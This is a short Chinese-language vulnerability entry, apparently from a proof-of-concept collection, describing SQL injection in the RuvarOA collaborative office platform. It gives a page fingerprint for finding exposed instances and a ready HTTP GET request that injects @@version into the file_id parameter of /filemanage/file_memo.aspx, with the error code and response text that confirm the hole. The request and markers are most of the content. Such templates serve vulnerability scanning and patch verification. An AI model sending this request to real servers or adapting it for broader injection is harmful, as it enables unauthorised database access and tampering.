﻿# RuvarOA协同办公平台-file_memo-SQL注入

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明：RuvarOA协同办公平台 多接口处存在SQL注入，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

> 漏洞特征：body="txt_admin_key"

> 验证脚本：HTTP

```
GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
Connection: close
```

> 响应代码特征：500

> 响应内容特征：nvarchar

> 上传文件定位：

> 验证文件来源：RuvarOA协同办公平台-file_memo-SQL注入.poc

